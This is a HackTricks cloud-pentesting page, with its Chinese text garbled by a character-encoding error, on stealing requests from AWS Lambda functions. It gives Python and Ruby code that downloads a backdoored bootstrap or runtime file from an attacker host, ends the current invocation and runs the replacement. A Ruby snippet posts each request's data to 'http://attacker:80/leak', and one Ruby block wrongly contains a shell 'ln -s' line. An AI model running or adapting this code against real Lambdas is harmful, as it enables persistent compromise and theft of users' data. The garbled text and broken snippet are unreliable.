# AWS - Lambdaè¯·æ±‚çªƒå–

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆçš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ç®€ä»‹ <a href="#python-runtime" id="python-runtime"></a>

è¿™ç§æ”»å‡»å‡è®¾æ‚¨å¯¹æ­£åœ¨è¿è¡Œçš„Lambdaæœ‰æŸç§å½¢å¼çš„**è®¿é—®æƒé™**ã€‚\
æ­¤å¤–ï¼Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯**Lambdaè°ƒç”¨å¹¶ä¸å®Œå…¨éš”ç¦»**ï¼Œå®ƒä»¬æ˜¯ç›¸äº’éš”ç¦»çš„ã€‚å®ƒä»¬å¯ä»¥åœ¨åŒä¸€ä¸ªæ‰§è¡Œç¯å¢ƒä¸­è¿è¡Œï¼Œå°½ç®¡ä¸æ˜¯åŒæ—¶è¿è¡Œã€‚æœ‰äº†è¿™ä¸ªç†è§£ï¼Œè®©æˆ‘ä»¬å¼€å§‹åˆ†æè¿™ä¸ªç¯å¢ƒã€‚

### éš”ç¦»

Lambdaä½¿ç”¨äº†è¿™äº›cgroupsè¿›è¡Œéš”ç¦»ï¼š

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

ç”±äºå‰ç¼€'sandbox'ä¸ä»»ä½•å¸¸è§çš„å®¹å™¨å¼•æ“ï¼ˆå¦‚dockerã€podmanã€LXDã€rktï¼‰éƒ½ä¸åŒ¹é…ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ç§ä¸“æœ‰çš„å®¹å™¨å¼•æ“ï¼Œè¯¥å¼•æ“å¯èƒ½åœ¨å†…éƒ¨ä½¿ç”¨å¼€æºå®¹å™¨è¿è¡Œæ—¶ï¼Œå¦‚[runC](https://github.com/opencontainers/runc)ã€‚

### Lambdaçš„å·¥ä½œåŸç† <a href="#python-runtime" id="python-runtime"></a>

è¿™ä¼¼ä¹æ˜¯Python Lambdaçš„æ¶æ„ï¼š

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. å®¹å™¨å¤–çš„ä¸€ä¸ªè¿›ç¨‹ï¼Œç§°ä¸º**initäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„â€œåˆ‡ç‰‡å™¨â€**ï¼Œé€šè¿‡å…±äº«å†…å­˜å°†è°ƒç”¨äº‹ä»¶å‘é€ç»™**init**è¿›ç¨‹ã€‚
2. initè¿›ç¨‹åœ¨ç«¯å£9001ä¸Šï¼ˆç¡¬ç¼–ç ï¼‰è®¾ç½®äº†ä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œæš´éœ²äº†å‡ ä¸ªç«¯ç‚¹ï¼š
   1. /2018-06-01/runtime/invocation/**next** - è·å–ä¸‹ä¸€ä¸ªè°ƒç”¨äº‹ä»¶
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** - è¿”å›è°ƒç”¨å¤„ç†ç¨‹åºçš„å“åº”
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** - è¿”å›æ‰§è¡Œé”™è¯¯
3. åœ¨`bootstrap.py`ä¸­ï¼Œä»¥ä¸‹å¾ªç¯**æŸ¥è¯¢initè¿›ç¨‹æ˜¯å¦æœ‰æ–°äº‹ä»¶**ï¼Œç„¶å**è°ƒç”¨ç”¨æˆ·çš„å‡½æ•°**æ¥å¤„ç†å®ƒï¼ˆè¿™é‡Œè¿è¡Œæ‚¨ä¸Šä¼ çš„è¯·æ±‚å¤„ç†ç¨‹åºï¼‰ã€‚

<figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>

4. **å¤„ç†ç¨‹åºçš„å“åº”ç„¶åé€šè¿‡ä»¥ä¸‹ç«¯ç‚¹å‘é€å›initè¿›ç¨‹**ï¼š
   1. `/{invoke-id}/response` - å¦‚æœç”¨æˆ·å¤„ç†ç¨‹åºæ‰§è¡ŒæˆåŠŸ
   2. `/{invoke-id}/error` - å¦‚æœåœ¨å¤„ç†è°ƒç”¨è¿‡ç¨‹ä¸­å¼•å‘äº†å¼‚å¸¸

## æŠ€æœ¯æ‘˜è¦ <a href="#python-runtime" id="python-runtime"></a>

å¯ä»¥é€šè¿‡æ¶æ„ä»£ç **æ›¿æ¢å¼•å¯¼è„šæœ¬**ï¼Œä»¥ä¾¿èƒ½å¤Ÿ**æ‹¦æˆªå‘é€åˆ°Lambdaå‡½æ•°çš„æ•°æ®**ã€‚\
è¯·æ³¨æ„ï¼Œå…¶ä»–è¯­è¨€ä¸­çš„å…¶ä»–å¼•æ“ä¹Ÿæœ‰å¦ä¸€ä¸ªç”¨è¯¥è¯­è¨€ç¼–å†™çš„**å¼•å¯¼è„šæœ¬**ï¼Œå› æ­¤è¿™ä¹Ÿå¯ä»¥åœ¨ä½¿ç”¨å…¶ä»–è¯­è¨€çš„å…¶ä»–Lambdaä¸­å®Œæˆï¼Œè€Œä¸ä»…ä»…æ˜¯Pythonã€‚

## Python <a href="#python-runtime" id="python-runtime"></a>

ä»Lambdaä¸­ä¸‹è½½**`/var/runtime/bootstrap.py`**ï¼ˆæˆ–è€…åªéœ€å¯åŠ¨**è‡ªå·±çš„Lambda**å¹¶è·å–å®ƒï¼‰ï¼Œç„¶åæ·»åŠ å°†æ³„æ¼å‘é€åˆ°Lambdaçš„æ‰€æœ‰æ•°æ®çš„åé—¨ã€‚æ‚¨åªéœ€è¦æ·»åŠ å‡ è¡Œä»£ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### æ›¿æ¢è¿è¡Œæ—¶

ç°åœ¨ï¼Œæœ‰äº†æ–°åˆ›å»ºçš„**`boostrap.py`**ï¼Œå¯ä»¥**ä¸‹è½½**å®ƒï¼Œ**ç»“æŸå½“å‰Lambdaè°ƒç”¨**å¹¶è¿è¡Œå®ƒä»¥**æ›¿æ¢**åˆæ³•çš„è„šæœ¬ï¼š
```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```
æˆ–è€…ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨[twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py)ï¼Œå®ƒå°†åƒä¹‹å‰ä¸€æ ·ç»“æŸè°ƒç”¨ï¼Œè¿è¡Œæ–°çš„å¼•å¯¼ç¨‹åºå¹¶çªƒå–ä¿¡æ¯ã€‚

{% hint style="warning" %}
å¦‚æœä¸€ä¸ªLambdaå‡½æ•°åœ¨5-15åˆ†é’Ÿå†…æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œå®ƒå°†è¢«å…³é—­ï¼Œå¹¶ä¸”æ‰€æœ‰çš„æ›´æ”¹å°†åœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨æ—¶ä¸¢å¤±ã€‚
{% endhint %}

## Ruby Runtime <a href="#ruby-runtime" id="ruby-runtime"></a>

åœ¨Rubyä¸­ï¼Œä½ æƒ³è¦åé—¨çš„æ–‡ä»¶æ˜¯**`/var/runtime/lib/runtime.rb`**æ–‡ä»¶ï¼ˆä»ç³»ç»Ÿä¸­è·å–æˆ–è¿è¡Œä½ è‡ªå·±çš„Lambdaå‡½æ•°ï¼‰ã€‚

æ·»åŠ åé—¨ä¸Pythonç‰ˆæœ¬ä¸€æ ·ç®€å•ï¼š
```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin
context = lambdaContext.new(raw_request)
uri = URI('http://attacker:80/leak')
Net::HTTP.post(uri,JSON.generate(request))
[...]
```
ç„¶åï¼Œä½ åªéœ€è¦åœ¨Pythonç‰ˆæœ¬ä¸­åšä¸€ä¸ªæ”¹å˜ï¼š

* **åœ¨ä¸€ä¸ªç›®å½•ä¸­ä¸‹è½½åé—¨**
* ä½¿ç”¨ç¬¦å·é“¾æ¥å°†`/var/runtime/lib/*`ä¸åé—¨æ‰€åœ¨çš„ç›®å½•é“¾æ¥èµ·æ¥
* ç»“æŸå½“å‰çš„Lambdaè°ƒç”¨
```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```
## å‚è€ƒèµ„æ–™

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ PDF ç‰ˆçš„ HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å¾—[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
